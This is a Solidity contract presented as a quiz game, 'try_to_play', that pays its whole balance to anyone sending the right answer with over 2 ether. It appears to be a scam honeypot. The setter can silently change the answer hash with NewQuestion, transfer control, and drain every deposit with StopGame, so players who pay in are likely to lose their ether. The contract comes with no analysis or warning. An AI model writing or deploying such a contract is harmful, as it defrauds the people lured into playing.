1 pragma solidity ^0.4.25;
2 
3 contract try_to_play {
4     function Try(string _response) external payable {
5         require(msg.sender == tx.origin);
6 
7         if(responseHash == keccak256(_response) && msg.value > 2 ether)
8         {
9             msg.sender.transfer(this.balance);
10         }
11     }
12 
13     string public question;
14 
15     address questionSender;
16 
17     bytes32 responseHash;
18 
19     bytes32 questionerPin = 0x3220587a12f2ddeabd33fb6830925eae0456db99c9af8ea248d79044ffafd632;
20 
21     function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
22         if(keccak256(_questionerPin)==questionerPin) 
23         {
24             responseHash = keccak256(_response);
25             question = _question;
26             questionSender = msg.sender;
27             questionerPin = 0x0;
28         }
29     }
30 
31     function StopGame() public payable {
32         require(msg.sender==questionSender);
33         msg.sender.transfer(this.balance);
34     }
35 
36     function NewQuestion(string _question, bytes32 _responseHash) public payable {
37         if(msg.sender==questionSender){
38             question = _question;
39             responseHash = _responseHash;
40         }
41     }
42 
43     function newQuestioner(address newAddress) public {
44         if(msg.sender==questionSender)questionSender = newAddress;
45     }
46 
47     function() public payable{}
48 }